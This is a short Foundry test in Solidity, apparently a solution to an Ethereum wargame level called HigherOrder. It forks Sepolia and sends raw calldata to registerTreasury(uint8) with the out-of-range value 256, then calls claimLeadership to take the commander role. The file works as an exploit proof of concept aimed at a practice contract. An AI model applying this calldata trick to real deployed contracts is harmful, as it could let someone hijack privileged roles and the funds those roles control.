// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {HigherOrder} from "../src/HigherOrder.sol";

contract HigherOrderTest is Test {

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6721224);
    }

    function test_ClaimLeadership() public {
        HigherOrder higherOrder = HigherOrder(0x03776Ab3c177B7fDBB6E14Ed03A2210Adb075765);

        (bool success, ) = address(higherOrder).call(
            abi.encodeWithSignature("registerTreasury(uint8)", 256)
        );

        // higherOrder.registerTreasury(uint8(uint256(1000)));

        console.log("treasury : ", higherOrder.treasury());

        higherOrder.claimLeadership();

        console.log("commander : ", higherOrder.commander());
    }
}
